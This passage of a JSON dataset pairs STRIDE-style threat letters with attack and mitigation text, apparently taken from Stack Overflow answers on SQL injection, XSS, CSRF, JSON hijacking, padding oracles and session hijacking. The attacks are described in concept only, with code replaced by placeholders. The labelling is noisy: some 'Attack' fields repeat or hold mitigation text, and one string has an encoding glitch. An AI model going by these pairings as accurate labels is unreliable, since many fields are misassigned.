[
  {
    "Threat": "I",
    "Attack": " Contrived example: say Google has a URL like [CODE] which returns the first 50 messages of your inbox in JSON format. Evil websites on other domains can't make AJAX requests to get this data due to the same-origin policy, but they can include the URL via a [CODE] tag. The URL is visited with your cookies, and by [LINK] they can have a method called whenever an object (array or hash) attribute is set, allowing them to read the JSON content. ",
    "Mitigation": " The [CODE] or [CODE] prevents this: an AJAX request at [CODE] will have full access to the text content, and can strip it away. But a [CODE] tag insertion blindly executes the JavaScript without any processing, resulting in either an infinite loop or a syntax error. "
  },
  {
    "Threat": "D",
    "Attack": " Strings are immutable. That means once you've created the [CODE], if another process can dump memory, there's no way you can get rid of the data before [LINK] kicks in. ",
    "Mitigation": " With an array, you can explicitly wipe the data after you're done with it. You can overwrite the array with anything you like, and the password won't be present anywhere in the system, even before garbage collection.  As noted in the comments, it's possible that arrays being moved by the garbage collector will leave stray copies of the data in memory. I believe this is implementation-specific - the garbage collector may clear all memory as it goes, to avoid this sort of thing. Even if it does, there's still the time during which the [CODE] contains the actual characters as an attack window. "
  },
  {
    "Threat": "T",
    "Attack": " That's because the user can input something like [CODE], and the query becomes:[CODE]  The correct way to avoid SQL injection attacks, no matter which database you use, is to separate the data from SQL, so that data stays data and will never be interpreted as commands by the SQL parser. It is possible to create SQL statement with correctly formatted data parts, but if you don't fully understand the details, you should always use prepared statements and parameterized queries.  ",
    "Mitigation": " The correct way to avoid SQL injection attacks, no matter which database you use, is to separate the data from SQL, so that data stays data and will never be interpreted as commands by the SQL parser. It is possible to create SQL statement with correctly formatted data parts, but if you don't fully understand the details, you should always use prepared statements and parameterized queries.  "
  },
  {
    "Threat": "T",
    "Attack": " And also very well said by @inazaruk: Whatever you do to your code, a potential attacker is able to change code in any way she or he finds it feasible. You basically can't protect your application from being modified. And any protection you put in there can be disabled/removed. ",
    "Mitigation": " You can do different tricks to make hacking harder though. For example, use obfuscation (if it's Java code). This usually slows down reverse engineering significantly.  As everyone says, and as you probably know, there's no 100% security. But the place to start for Android, that Google has built in, is ProGuard. If you have the option of including shared libraries, you can include the needed code in C++ to verify file sizes, integration,etc. If you need to add an external native library to your APK's library folder on every build,then you can use it by the below suggestion.  Put the library in the native library path which defaults to \"libs\" inyour project folder. If you built the native code for the 'armeabi' target then put itunder libs/armeabi. If it was built with armeabi-v7a then put it underlibs/armeabi-v7a.  [CODE] "
  },
  {
    "Threat": "T",
    "Attack": " Do you know of any possible injection that would get through the PHP code above? ",
    "Mitigation": " [CODE] will not protect you against this.The fact that you use single quotes ([CODE]) around your variables inside your query is what protects you against this. The following is also an option:  [CODE] "
  },
  {
    "Threat": "S",
    "Attack": " Coda Hale's article [LINK] claims that:bcrypt has salts built-in to prevent rainbow table attacks.He cites [LINK], which says that in OpenBSD's implementation of [CODE]:OpenBSD generates the 128-bit bcrypt salt from an arcfour(arc4random(3)) key stream, seeded with random data the kernelcollects from device timings.I don't understand how this can work. In my conception of a salt:It needs to be different for each stored password, so that a separate rainbow table would have to be generated for eachIt needs to be stored somewhere so that it's repeatable: when a user tries to log in, we take their password attempt, repeat the same salt-and-hash procedure we did when we originally stored their password, and compareWhen I'm using Devise (a Rails login manager) with bcrypt, there is no salt column in the database, so I'm confused. If the salt is random and not stored anywhere, how can we reliably repeat the hashing process?In short, how can bcrypt have built-in salts? ",
    "Mitigation": " This is bcrypt:  Generate a random salt. A \"cost\" factor has been pre-configured. Collect a password.  Derive an encryption key from the password using the salt and cost factor. Use it to encrypt a well-known string. Store the cost, salt, and cipher text. Because these three elements have a known length, it's easy to concatenate them and store them in a single field, yet be able to split them apart later.  When someone tries to authenticate, retrieve the stored cost and salt. Derive a key from the input password, cost and salt. Encrypt the same well-known string. If the generated cipher text matches the stored cipher text, the password is a match.  Bcrypt operates in a very similar manner to more traditional schemes based on algorithms like PBKDF2. The main difference is its use of a derived key to encrypt known plain text; other schemes (reasonably) assume the key derivation function is irreversible, and store the derived key directly.    Stored in the database, a [CODE] \"hash\" might look something like this:    $2a$10$vI8aWBnW3fID.ZQ4/zo1G.q1lRps.9cGLcZEiGDMVr5yUP1KUOYTa  This is actually three fields, delimited by \"$\":  [CODE] identifies the [CODE] algorithm version that was used.[CODE] is the cost factor; 210 iterations of the key derivation function are used (which is not enough, by the way. I'd recommend a cost of 12 or more.)[CODE] is the salt and the cipher text, concatenated and encoded in a modified Base-64. The first 22 characters decode to a 16-byte value for the salt. The remaining characters are cipher text to be compared for authentication.  This example is taken from the [LINK] "
  },
  {
    "Threat": "I",
    "Attack": " This approach provides defense-in-depth. If someone manages to leak the database table, it does not give an attacker an open door for impersonating users. ",
    "Mitigation": " You could use this strategy described [LINK] (2006) or [LINK] (2015):  When the user successfully logs in with Remember Me checked, a login cookie is issued in addition to the standard session management cookie.The login cookie contains a series identifier and a token. The series and token are unguessable random numbers from a suitably large space. Both are stored together in a database table, the token is hashed (sha256 is fine).When a non-logged-in user visits the site and presents a login cookie, the series identifier is looked up in the database.  If the series identifier is present and the hash of the token matches the hash for that series identifier, the user is considered authenticated. A new token is generated, a new hash for the token is stored over the old record, and a new login cookie is issued to the user (it's okay to re-use the series identifier).If the series is present but the token does not match, a theft is assumed. The user receives a strongly worded warning and all of the user's remembered sessions are deleted.If the username and series are not present, the login cookie is ignored. "
  },
  {
    "Threat": "S",
    "Attack": " As I understand it, the vulnerability around CSRF is introduced by the assumption that (from the webserver's point of view) a valid session cookie in an incoming HTTP request reflects the wishes of an authenticated user. But all cookies for the origin domain are magically attached to the request by the browser, so really all the server can infer from the presence of a valid session cookie in a request is that the request comes from a browser which has an authenticated session; it cannot further assume anything about the code running in that browser, or whether it really reflects user wishes. The way to prevent this is to include additional authentication information (the \"CSRF token\") in the request, carried by some means other than the browser's automatic cookie handling. Loosely speaking, then, the session cookie authenticates the user/browser and the CSRF token authenticates the code running in the browser. ",
    "Mitigation": " <h1>Request Body Approach</h1>  User successfully logs in.Server issues auth cookie.User clicks to navigate to a form.If not yet generated for this session, server generates CSRF token, stores it against the user session and outputs it to a hidden field.User submits form.Server checks hidden field matches session stored token. "
  },
  {
    "Threat": "T",
    "Attack": " What are the best workarounds for using a SQL [CODE] clause with instances of [CODE], which is not supported for multiple values due to SQL injection attack security issues: One [CODE] placeholder represents one value, rather than a list of values. ",
    "Mitigation": " An analysis of the various options available, and the pros and cons of each is available [LINK].The suggested options are:Prepare [CODE], execute it for each value and UNION the results client-side. Requires only one prepared statement. Slow and painful.Prepare [CODE] and execute it. Requires one prepared statement per size-of-IN-list. Fast and obvious.Prepare [CODE] and execute it. [Or use [CODE] in place of those semicolons. --ed] Requires one prepared statement per size-of-IN-list. Stupidly slow, strictly worse than [CODE], so I don't know why the blogger even suggested it.Use a stored procedure to construct the result set.Prepare N different size-of-IN-list queries; say, with 2, 10, and 50 values. To search for an IN-list with 6 different values, populate the size-10 query so that it looks like [CODE]. Any decent server will optimize out the duplicate values before running the query.None of these options are ideal.The best option if you are using JDBC4 and a server that supports [CODE], is to use [CODE] as [LINK]There doesn't seem to be any way to make [CODE] work with IN-lists, though.<hr />Sometimes SQL statements are loaded at runtime (e.g., from a properties file) but require a variable number of parameters. In such cases, first define the query:[CODE]For certain databases where passing an array via the JDBC 4 specification is unsupported, this method can facilitate transforming the slow [CODE] into the faster [CODE] clause condition, which can then be expanded by calling the [CODE] method. "
  },
  {
    "Threat": "S",
    "Attack": " It looks like we'll be adding [LINK] support to Stack Overflow. This is necessary to prevent bots, spammers, and other malicious scripted activity. We only want human beings to post or edit things here!  A spam bot will not support JavaScript and will submit what it sees. If the bot does support JavaScript it will submit the form instantly. The commenter has at least read some of the page before posting ",
    "Mitigation": " [LINK] and which seems to work perfectly (although I probably don't get as much comment spam as you), is to have a hidden field and fill it with a bogus value e.g.:  [CODE] "
  },
  {
    "Threat": "E",
    "Attack": " However, some people recommend that the salt be stored separately from the database. Their argument is that if the database is compromised, an attacker can still build a rainbow table, taking a particular salt string into account in order to crack one account at a time. If this account has admin privileges, then he may not even need to crack any others.  From a security perspective, is it worth it to store salts in a different place? Consider a web application with the server code and DB on the same machine. If the salts are stored in a flat file on that machine, chances are that if the database is compromised, the salts file will be compromised, too.  ",
    "Mitigation": " There's no real point in storing salts in a separate file as long as they're on a per-user basis - the point of the salt is simply to make it so that one rainbow table can't break every password in the DB. "
  },
  {
    "Threat": "I",
    "Attack": " In order to mitigate against kernel or cross-process memory disclosure (the [LINK] attack), [LINK], [CODE] introduced to [CODE] to perform indirect calls through a so-called retpoline. ",
    "Mitigation": " It introduces the new [LINK] call that loads the call target whose memory address (which I'll call [CODE]) is stored on top of the stack and executes the jump using a the [CODE] instruction. The thunk itself is then called using the [LINK] macro, which was used to replace many (if not all) indirect calls and jumps. The macro simply places the call target on the stack and sets the return address correctly, if necessary (note the non-linear control flow):  [CODE]  The placement of [CODE] in the end is necessary so that when the indirect call is finished, the control flow continues behind the use of the [CODE] macro, so it can be used in place of a regular [CODE] "
  },
  {
    "Threat": "S",
    "Attack": " How exactly is this done? What about the process makes it immune to man-in-the-middle attacks?What prevents some random person from setting up their own verification service to use in man-in-the-middle attacks, so everything \"looks\" secure?  Note that the certificate authority (CA) is essential to preventing man-in-the-middle attacks.  However, even an unsigned certificate will prevent someone from passively listening in on your encrypted traffic, since they have no way to gain access to your shared symmetric key. ",
    "Mitigation": " Note that the certificate authority (CA) is essential to preventing man-in-the-middle attacks.  However, even an unsigned certificate will prevent someone from passively listening in on your encrypted traffic, since they have no way to gain access to your shared symmetric key. "
  },
  {
    "Threat": "I",
    "Attack": "   is both immutable and, when no longer needed, cannot be programmatically scheduled for garbage collection; that is, the instance is read-only after it is created and it is not possible to predict when the instance will be deleted from computer memory. Consequently, if a String object contains sensitive information such as a password, credit card number, or personal data, there is a risk the information could be revealed after it is used because your application cannot delete the data from computer memory. ",
    "Mitigation": " Do you know how to avoid all these problems? [CODE]. It generally makes sure you don't make silly mistakes as such. How does it avoid it? By making sure that password is encrypted in unmanaged memory and the real value can be only accessed when you are 90% sure what you're doing.  What if the user has access to your computer? Would a virus be able to get access to all the [CODE]? Yes. All you need to do is hook yourself into [CODE] when the memory is being decrypted, you will get the location of the unencrypted memory address, and read it out. Voila! In fact, you could make a virus that will constantly scan for usage of [CODE] and log all the activities with it. I am not saying it will be an easy task, but it can be done. As you can see, the \"powerfulness\" of [CODE] is completely gone once there's a user/virus in your system.  You can always extend the [CODE] class with an extension method, such as [CODE], which gives you a [CODE] instance of [CODE] that is encrypted using server's public key. Only server can then decrypt it. Problem solved: Garbage Collection will never see the \"original\" string, as you never expose it in managed memory. This is exactly what is being done in [LINK] ([CODE]). "
  },
  {
    "Threat": "T",
    "Attack": " What I really need is the strongest encryption possible in Flash/PHP, and a way to prevent people calling the PHP page other than through my Flash file. I have tried some simple methods in the past of making multiple calls for a single score and completing a checksum / fibonacci sequence etc, and also obfuscating the SWF with Amayeta SWF Encrypt, but they were all hacked eventually.  Flash is even easier to reverse engineer than you might think it is, since the bytecodes are well documented and describe a high-level language (Actionscript) --- when you publish a Flash game, you're publishing your source code, whether you know it or not.Attackers control the runtime memory of the Flash interpreter, so that anyone who knows how to use a programmable debugger can alter any variable (including the current score) at any time, or alter the program itself.  The game code echoes this token back to the server with the high-score save. But an attacker can still just launch the game again, get a token, and then immediately paste that token into a replayed high-score save.   So now the attacker decompiles your Flash code and quickly finds the AES code, which sticks out like a sore thumb, although even if it didn't it'd be tracked down in 15 minutes with a memory search and a tracer (\"I know my score for this game is 666, so let's find 666 in memory, then catch any operation that touches that value --- oh look, the high score encryption code!\"). With the session key, the attacker doesn't even have to run the Flash code; she grabs a game launch token and a session key and can send back an arbitrary high score. ",
    "Mitigation": " Require a login to play the game, have the login produce a session cookie, and don't allow multiple outstanding game launches on the same session, or multiple concurrent sessions for the same user.Reject high scores from game sessions that last less than the shortest real games ever played (for a more sophisticated approach, try \"quarantining\" high scores for game sessions that last less than 2 standard deviations below the mean game duration). Make sure you're tracking game durations serverside.Reject or quarantine high scores from logins that have only played the game once or twice, so that attackers have to produce a \"paper trail\" of reasonable looking game play for each login they create.\"Heartbeat\" scores during game play, so that your server sees the score growth over the lifetime of one game play. Reject high scores that don't follow reasonable score curves (for instance, jumping from 0 to 999999). \"Snapshot\" game state during game play (for instance, amount of ammunition, position in the level, etc), which you can later reconcile against recorded interim scores. You don't even have to have a way to detect anomalies in this data to start with; you just have to collect it, and then you can go back and analyze it if things look fishy.Disable the account of any user who fails one of your security checks (for instance, by ever submitting an encrypted high score that fails validation).  "
  },
  {
    "Threat": "T",
    "Attack": " How do [LINK] help us prevent [LINK] attacks?Wikipedia says:Prepared statements are resilient against SQL injection, becauseparameter values, which are transmitted later using a differentprotocol, need not be correctly escaped. If the original statementtemplate is not derived from external input, SQL injection cannotoccur.I cannot see the reason very well. What would be a simple explanation in an easy English and some examples?  The root of the SQL injection problem is in the mixing of the code and the data.     In fact, our SQL query is a legitimate program. And we are creating such a program dynamically, adding some data on the fly. Thus, the data may interfere with the program code and even alter it, as every SQL injection example shows it (all examples in PHP/Mysql):  [CODE]  [CODE]  [CODE]  [CODE]  It works because we are adding the data directly to the program body and it becomes a part of the program, so the data may alter the program, and depending on the data passed, we will either have a regular output or a table [CODE] deleted.  [CODE]  [CODE] ",
    "Mitigation": " Prepared statements can protect only data literals, but cannot be used with any other query part.So, once we have to add, say, a dynamical identifier - a field name, for example - prepared statements can't help us. I've [LINK], so I won't repeat myself.  "
  },
  {
    "Threat": "I",
    "Attack": " However, env vars are not particularly secure either. They are visible via [CODE], and hence they are available to any user that can run [CODE] commands. (Of course, any user that has access to [CODE] on the host also [LINK] anyway.) ",
    "Mitigation": " My preferred pattern is to use a wrapper script as the [CODE] or [CODE]. The wrapper script can first import secrets from an outside location in to the container at run time, then execute the application, providing the secrets. The exact mechanics of this vary based on your run time environment. In AWS, you can use a combination of IAM roles, the [LINK], and S3 to store encrypted secrets in an S3 bucket. Something like [LINK] or [LINK] is another option.  AFAIK there is no optimal pattern for using sensitive data as part of the build process. In fact, I have an [LINK] on this topic. You can use [LINK] to remove layers from an image. But there's no native functionality in Docker for this purpose.  You may find shykes [LINK] useful.  "
  },
  {
    "Threat": "I",
    "Attack": "   The first stage of the attack takes a  few thousand requests, but once it  succeeds and the attacker gets the  secret keys, it's totally stealthy.The  cryptographic knowledge required is  very basic.  In posession of the app's machine key, the attacker can decrypt authentication cookies.Even worse than that, he can generate authentication cookies with the name of any user. Thus, he can appear as anyone on the site. The application is unable to differentiate between you or the hacker who generated an authentication cookie with your name for himself.It also lets him to decrypt (and also generate) session cookies, although this is not as dangerous as the previous one.Not so serious: He can decrypt the encrypted ViewState of pages. (If you use ViewState to store confidental data, you shouldn't do this anyways!)Quite unexpected: With the knowledge of the machine key, the attacker can download any arbitrary file from your web application, even those that normally can't be downloaded! (Including Web.Config, etc.) ",
    "Mitigation": "   The attack that Rizzo and Duong have implemented against ASP.NET apps requires that the crypto  implementation on the Web site have an oracle that, when sent ciphertext, will not only decrypt the text  but give the sender a message about whether the padding in the ciphertext is valid.     If the padding is invalid, the error message that the sender gets will give him some information about the way that the site's decryption process works.  In order for the attack to work the following must be true:  Your application must give an error message about the padding being invalid.Someone must tamper with your encrypted cookies or viewstate  So, if you return human readable error messages in your app like \"Something went wrong, please try again\" then you should be pretty safe. Reading a bit on the comments on the article also gives valuable information.  Store a session id in the crypted cookieStore the real data in session state (persisted in a db)Add a random wait when user information is wrong before returning the error, so you can't time it  That way a hijacked cookie can only be used to retrieve a session which most likely is no longer present or invalidated. "
  },
  {
    "Threat": "I",
    "Attack": " Wouldn't this just make it easier for brute force attacks? (Bad)Does this imply that my password stored unencrypted? (Bad) If someone with (hopefully) some good IT security professionals working for them are imposing a max password length to avoid password stored unencrypted, should I think about doing similar? What are the pros/cons of this? ",
    "Mitigation": " Passwords are hashed to 32, 40, 128, whatever length. The only reason for a minimum length is to prevent easy to guess passwords. There is no purpose for a maximum length.  The obligatory [LINK] explaining why you're doing your user a disservice if you impose a max length:  [LINK] "
  },
  {
    "Threat": "S",
    "Attack": " Incidentally, if same-origin does not affect form POSTs - then it makes it somewhat more obvious of why anti-forgery tokens are necessary.  I say \"somewhat\" because it seems too easy to believe that an attacker could simply issue an HTTP GET to retrieve a form containing the anti-forgery token, and then make an illicit POST which contains that same token.  Comments? ",
    "Mitigation": " The same origin policy is applicable only for browser side programming languages. So if you try to post to a different server than the origin server using JavaScript, then the same origin policy comes into play but if you post directly from the form i.e. the  action points to a different server like:  [CODE]  and there is no javascript involved in posting the form, then the same origin policy is not applicable.   See [LINK] for more information "
  },
  {
    "Threat": "I",
    "Attack": " Are these JSON Hijacking attacks still an issue today in modern browsers? ",
    "Mitigation": " No, it is no longer possible to capture values passed to the [CODE] or [CODE] constructors in Firefox 21, Chrome 27, or IE 10. Here's a little test page, based on the main attacks described in [LINK]:  The [LINK], in section 1.5, \"requires the global, standard bindings of Object and Array to be used to construct new objects for object and array initializers\" and notes in Implementation Precedent that \"Internet Explorer 6, Opera 9.20, and Safari 3 do not respect either local or global rebindings of Object and Array, but use the original Object and Array constructors.\" This is retained in [LINK].  [LINK] that ES5 also specifies that object initialization should not trigger setters, as it uses DefineOwnProperty. [LINK] notes that \"Starting in JavaScript 1.8.1, setters are no longer called when setting properties in object and array initializers.\" This was addressed in [LINK]. "
  },
  {
    "Threat": "T",
    "Attack": " I don't see any way to launch an SQL injection attack against this, but I realize that if this were as bulletproof as it seems to me someone else would have thought of it already and it would be common practice.    What's wrong with this code? Is there a way to get an SQL injection attack past this sanitization technique?  Sample user input that exploits this technique would be very helpful.  I still don't know of any way to effectively launch a SQL injection attack against this code. A few people suggested that a backslash would escape one single-quote and leave the other to end the string so that the rest of the string would be executed as part of the SQL command, and I realize that this method would work to inject SQL into a MySQL database, but in SQL&nbsp;Server 2000 the only way (that I've been able to find) to escape a single-quote is with another single-quote; backslashes won't do it.  I understand that there are better ways to sanitize input, but I'm really more interested in learning why the method I provided above won't work. If anyone knows of any specific way to mount a SQL injection attack against this sanitization method I would love to see it. ",
    "Mitigation": " Whitelist validation: type, length, format or accepted valuesIf you want to blacklist, go right ahead. Quote escaping is good, but within context of the other mitigations.Use Command and Parameter objects, to preparse and validateCall parameterized queries only.Better yet, use Stored Procedures exclusively. Avoid using dynamic SQL, and dont use string concatenation to build queries.If using SPs, you can also limit permissions in the database to executing the needed SPs only, and not access tables directly. you can also easily verify that the entire codebase only accesses the DB through SPs... "
  },
  {
    "Threat": "S",
    "Attack": " I am going to use oAuth to fetch mails and contacts from google. I don't want to ask the user each time to log in to obtain an access token and secret. From what I understood, I need to store them with my application either in a database or [CODE]. But I am a bit worried about security aspects with that. I read that you can encrypt and decrypt the tokens but it is easy for an attacker to just decompile your apk and classes and get the encryption key.What's the best method to securely store these tokens in Android? ",
    "Mitigation": " Store them as [LINK]. Those are by default private, and other apps cannot access them. On a rooted devices, if the user explicitly allows access to some app that is trying to read them, the app might be able to use them, but you cannot protect against that. As for encryption, you have to either require the user to enter the decrypt passphrase every time (thus defeating the purpose of caching credentials), or save the key to a file, and you get the same problem.  "
  },
  {
    "Threat": "T",
    "Attack": " localStorage is subjected to XSS and generally it's not recommended to store any sensitive information in it.With Cookies we can apply the flag \"httpOnly\" which mitigates the risk of XSS. However if we are to read the JWT from Cookies on backend, we then are subjected to CSRF.  I like the XSRF Double Submit Cookies method which mentioned in the article that @pkid169 said, but there is one thing that article doesn't tell you. You are still not protected against XSS because what the attacker can do is inject script that reads your CSRF cookie (which is not HttpOnly) and then make a request to one of your API endpoints using this CSRF token with JWT cookie being sent automatically.  So in reality you are still susceptible to XSS, it's just that attacker can't steal you JWT token for later use, but he can still make requests on your users behalf using XSS.   Whether you store your JWT in a localStorage or you store your XSRF-token in not http-only cookie, both can be grabbed easily by XSS. Even your JWT in HttpOnly cookie can be grabbed by an advanced XSS attack.   So in addition of the Double Submit Cookies method, you must always follow best practices against XSS including escaping contents. This means removing any executable code that would cause the browser to do something you don\u9225\u6a9b want it to. Typically this means removing // &lt;![CDATA[ tags and HTML attributes that cause JavaScript to be evaluated. ",
    "Mitigation": " So in addition of the Double Submit Cookies method, you must always follow best practices against XSS including escaping contents. This means removing any executable code that would cause the browser to do something you don\u9225\u6a9b want it to. Typically this means removing // &lt;![CDATA[ tags and HTML attributes that cause JavaScript to be evaluated. "
  },
  {
    "Threat": "S",
    "Attack": " If a malicious user has physical access to a machine, they can still look at the filesystem to retrieve a valid session cookie and use that to hijack a session? ",
    "Mitigation": " The only real solution is HTTPS. If you don't want to do SSL on your whole site (maybe you have performance concerns), you might be able to get away with only SSL protecting the sensitive areas. To do that, first make sure your login page is HTTPS. When a user logs in, set a secure cookie (meaning the browser will only transmit it over an SSL link) in addition to the regular session cookie. Then, when a user visits one of your \"sensitive\" areas, redirect them to HTTPS, and check for the presence of that secure cookie. A real user will have it, a session hijacker will not.  EDIT: This answer was originally written in 2008. It's 2016 now, and there's no reason not to have SSL across your entire site. No more plaintext HTTP! "
  },
  {
    "Threat": "I",
    "Attack": " Any variable that a user can control,  an attacker can also control and is therefore a source of an attack.  This is called a \"tainted\" variable, and is unsafe.  ",
    "Mitigation": " <h2>Server controlled</h2>  These variables are set by the server environment and depend entirely on the server configuration.  <h2>Entirely arbitrary user controlled values</h2>  These values are not checked at all and do not depend on any server configuration, they are entirely arbitrary information sent by the client.  May be considered reliable as long as the web server allows only certain request methods.  May be considered reliable if authentication is handled entirely by the web server.  The superglobal [CODE] also includes several environment variables. Whether these are \"safe\" or not depend on how (and where) they are defined. They can range from completely server controlled to completely user controlled. "
  },
  {
    "Threat": "S",
    "Attack": " Introduce an artificial server-side pause into each admin password check to prevent brute force attacks [Developer Art]Use separate login pages for users and admin using the same DB table (to stop XSRF and session-stealing granting access to admin areas) [Thief Master]Consider also adding webserver native authentication to the admin area (e.g. via .htaccess)  [Thief Master]Consider blocking users IP after a number of failed admin login attempts [Thief Master]Add captcha after failed admin login attempts [Thief Master]Provide equally strong mechanisms (using the above techniques) for users as well as admins (e.g. don't treat admins specially) [Lo'oris]Consider Second level authentication (e.g. client certificates, smart cards, cardspace, etc.) [JoeGeeky]Only allow access from trusted IPs/Domains, add check to basic HTTP pipeline (via e.g. HttpModules) if possible. [JoeGeeky][ASP.NET] Lock down IPrincipal &amp; Principal (make them immutable and non-enumerable) [JoeGeeky]Federate Rights Elevation - e.g. email other admins when any admin's rights are upgraded.[JoeGeeky]Consider fine-grained rights for admins - e.g. rather than roles based rights, define rights for indicidual actions per admin [JoeGeeky]Restrict creation of admins - e.g. Admins cannot change or create other admin accounts.  Use a locked-down 'superadmin' client for this. [JoeGeeky]Consider Client Side SSL Certificates, or RSA type keyfobs (electronic tokens) [Daniel Papasian]If using cookies for Authentication, use separate cookies for admin and normal pages, by e.g. putting the admin section on a different domain. [Daniel Papasian]If practical, consider keeping the admin site on a private subnet, off the public internet. [John Hartsock]Reissue auth/session tickets when moving between admin/normal usage contexts of the website [Richard JP Le Guen] ",
    "Mitigation": " Second level authentication: This could include client certificates (Ex. x509 certs), smart cards, cardspace, etc...Domain/IP restrictions: In this case, only clients coming from trusted/verifiable domains; such as internal subnets; are allowed into the admin area. Remote admins often go through trusted VPN entrypoints so their session would be verifiable and is often protected with RSA keys as well. If you're using ASP.NET you can easily perform these checks in the HTTP Pipeline via HTTP Modules which will prevent your application from ever receiving any requests if security checks are not satisfied.Locked down IPrincipal &amp; Principal-based Authorization: Creating custom Principles is a common practice, although a common mistake is making them modifiable and/or rights enumerable. Although its not just an admin issue, it's more important since here is where users are likely to have elevated rights. Be sure they're immutable and not enumerable. Additionally, make sure all assessments for Authorization are made based on the Principal.Federate Rights Elevation: When any account receives a select number of rights, all the admins and the security officer are immediately notified via email. This makes sure that if an attacker elevates rights we know right away. These rights generally revolve around priviledged rights, rights to see privacy protected information, and/or financial information (e.g. credit cards). Issue rights sparingly, even to Admins: Finally, and this can be a bit more advanced for some shops. Authorization rights should be as discreet as possible and should surround real functional behaviours. Typical Role-Based Security (RBS) approaches tend to have a Group mentality. From a security perspective this is not the best pattern. Instead of 'Groups' like 'User Manager', try breaking it down further (Ex. Create User, Authorize User, Elevate/Revoke access rights, etc...). This can have a little more overhead in terms of administration, but this gives you the flexibility to only assign rights that are actually needed by the larger admin group. If access is compromised at least they may not get all rights. I like to wrap this in Code Access Security (CAS) permissions supported by .NET and Java, but that is beyond the scope of this answer. One more thing... in one app, admins cannot manage change other admin accounts, or make a users an admin. That can only be done via a locked down client which only a couple people can access. "
  },
  {
    "Threat": "I",
    "Attack": " I have a small question.  I know that the %x format specifier can be used to read values from the stack in a format string attack. ",
    "Mitigation": " [CODE] says that you want to show 8 digits[CODE] that you want to prefix with [CODE]'s instead of just blank spaces[CODE] that you want to print in lower-case hexadecimal. "
  },
  {
    "Threat": "T",
    "Attack": " How can I prevent XSS attacks in a JSP/Servlet web application? ",
    "Mitigation": " XSS can be prevented in JSP by using [LINK] [LINK] tag or [LINK] EL function when (re)displaying user-controlled input. This includes request parameters, headers, cookies, URL, body, etc. Anything which you extract from the request object. Also the user-controlled input from previous requests which is stored in a database needs to be escaped during redisplaying.For example:[CODE]This will escape characters which may malform the rendered HTML such as [CODE], [CODE], [CODE], [CODE] and [CODE] into [LINK] such as [CODE], [CODE], [CODE], [CODE] and [CODE].Note that you don't need to escape them in the Java (Servlet) code, since they are harmless over there. Some may opt to escape them during request processing (as you do in Servlet or Filter) instead of response processing (as you do in JSP), but this way you may risk that the data unnecessarily get double-escaped (e.g. [CODE] becomes [CODE] instead of [CODE] and ultimately the enduser would see [CODE] being presented), or that the DB-stored data becomes unportable (e.g. when exporting data to JSON, CSV, XLS, PDF, etc which doesn't require HTML-escaping at all). You'll also lose social control because you don't know anymore what the user has actually filled in. You'd as being a site admin really like to know which users/IPs are trying to perform XSS, so that you can easily track them and take actions accordingly. Escaping during request processing should only and only be used as latest resort when you really need to fix a train wreck of a badly developed legacy web application in the shortest time as possible. Still, you should ultimately rewrite your JSP files to become XSS-safe.If you'd like to redisplay user-controlled input as HTML wherein you would like to allow only a specific subset of HTML tags like [CODE], [CODE], [CODE], etc, then you need to sanitize the input by a whitelist. You can use a HTML parser like [LINK] for this. But, much better is to introduce a human friendly markup language such as Markdown (also used here on Stack Overflow). Then you can use a Markdown parser like [LINK] for this. It has also builtin HTML sanitizing capabilities. See also [LINK].The only concern in the server side with regard to databases is [LINK] prevention. You need to make sure that you never string-concatenate user-controlled input straight in the SQL or JPQL query and that you're using parameterized queries all the way. In JDBC terms, this means that you should use [LINK] instead of [CODE]. In JPA terms, use [LINK].<hr />An alternative would be to migrate from JSP/Servlet to Java EE's MVC framework [LINK]. It has builtin XSS (and CSRF!) prevention over all place. See also [LINK]. "
  },
  {
    "Threat": "T",
    "Attack": "   Script-Tags: The attacker can embed a  script tag pointing at a remote server  and the browser will effectively  eval() the reply for you, however it  throws away the response and since  JSON is all response, you're safe. ",
    "Mitigation": " When people talk about unique URLs, they generally DON'T mean [LINK]. Instead, it's more common to make something else about the request unique; namely a value in the FORM post, or a URL parameter.  Usually this involves a random token inserted into the FORM on the server side, and then checked when a request is made. "
  },
  {
    "Threat": "S",
    "Attack": " After User A logs in on example.com, he is given some random session ID, for simplicity's sake, let it be 'abc123'. This session ID is stored as a cookie on the client side and is validated with a server-side session to ensure the user who logged in remains logged in as he moves from one webpage to another. This cookie of course would not need to exist if HTTP were not stateless. For that reason, if User B steals User A's SID, and creates a cookie on his computer with the value 'abc123', he would have successfully hijacked User A's session, but there is simply no way for the server to legitimately recognize that User B's request is any different from User A's requests, and therefore the server has no reason to reject any request. Even if we were to list the sessions that were already active on the server and try to see if someone is accessing a session that is already active, how can we determine that it is another user who is accessing the session illegitimately and not the same user who is already logged in with a session ID, but simply trying to make another request with it (ie navigate to a different webpage). We can't. Checking the user agent? Can be spoofed - but good as a Defense in Depth measure nevertheless. IP Address? Can change for legitimate reasons - but instead of not checking for the IP address at all, I suggest checking something like the first two octets of the IP, as even a user on a data plan network who constantly has a changing IP for perfectly legitimate reasons would only usually have the last two octets of their IP change. ",
    "Mitigation": " That's why the best method to prevent session hijacking is to make sure an attacker cannot find out another user's session ID. This means you should design your application and its session management that (1) an attacker cannot guess a valid session ID by using enough entropy, and (2) that there is no other way for an attacker to obtain a valid session ID by known attacks/vulerabilities like sniffing the network communication, Cross-Site Scripting, leakage through Referer, etc.  use enough random input for generating the session ID (see [LINK], [LINK], and [LINK])use HTTPS to protect the session ID during transmissionstore the session ID in a cookie and not in the URL to avoid leakage though Referer (see [LINK])set the cookie with the [CODE] and [CODE] attributes to forbid access via JavaScript (in case of XSS vulnerabilities) and to forbid transmission via insecure channel (see [LINK] and [LINK])  Besides that, you should also regenerate the session ID while invalidating the old one (see [LINK]) after certain session state changes (e. g. confirmation of authenticity after login or change of authorization/privileges) and you can additionally do this periodically to reduce the time span for a successful session hijacking attack. "
  },
  {
    "Threat": "T",
    "Attack": " This introduces a high risk of XSS hacks - a user could potentially enter javascript that another user ends up executing. Since we hold sensitive data it's essential that this never happens. ",
    "Mitigation": " If you think URLs can't contain code, think again![LINK]Read that, and weep.Here's how we do it on Stack Overflow:[CODE] "
  },
  {
    "Threat": "S",
    "Attack": " EDIT: and for those who think anyone on the internet being able to read your sources and executing arbitrary code on your VM is not that bad, I recommend reading the \"Breaking out\" section in this blog post [LINK] ",
